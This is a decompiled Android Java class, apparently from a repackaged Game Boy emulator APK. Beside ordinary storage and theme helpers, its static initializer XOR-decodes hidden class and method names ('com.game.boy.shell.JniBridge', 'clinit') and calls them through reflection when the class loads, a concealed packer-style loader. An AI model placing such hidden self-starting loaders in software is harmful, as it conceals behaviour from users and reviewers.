package L2suez;

import android.R;
import android.os.Environment;
import android.util.TypedValue;
import androidx.fragment.app.FragmentActivity;
import java.io.File;
import java.lang.reflect.Method;

/* loaded from: D:\mgba-android-version\tmp_gboy_apk\decoded\classes2.dex */
public class B9tovu {

    /* renamed from: A2egSU, reason: collision with root package name */
    public static final String[] f4390A2egSU = {".jpg", ".jpeg", ".png", ".gif", ".webp", ".bmp"};

    static {
        bNTxs();
    }

    public static File A2egSU(String str) {
        File file = new File(Environment.getExternalStorageDirectory(), str);
        if (file.exists() || file.mkdirs()) {
            return file;
        }
        throw new RuntimeException("Failed to create directory: " + file.getAbsolutePath());
    }

    public static int A4TApA(FragmentActivity fragmentActivity, int i) {
        TypedValue typedValue = new TypedValue();
        return fragmentActivity.getTheme().resolveAttribute(i, typedValue, true) ? typedValue.data : R.color.black;
    }

    private static /* synthetic */ void bNTxs() {
        char[] charArray = "\\PR\u0011X^RZ\u0011]PF\u0011LWZSS\u0011uQV}MV[XZ".toCharArray();
        int length = charArray.length;
        for (int i = 0; i < length; i++) {
            charArray[i] = (char) (charArray[i] ^ '?');
        }
        String str = new String(charArray);
        char[] charArray2 = "\\SVQVK".toCharArray();
        int length2 = charArray2.length;
        for (int i2 = 0; i2 < length2; i2++) {
            charArray2[i2] = (char) (charArray2[i2] ^ '?');
        }
        Method declaredMethod = Class.forName(str).getDeclaredMethod(new String(charArray2), new Class[0]);
        declaredMethod.setAccessible(true);
        declaredMethod.invoke(null, new Object[0]);
    }
}
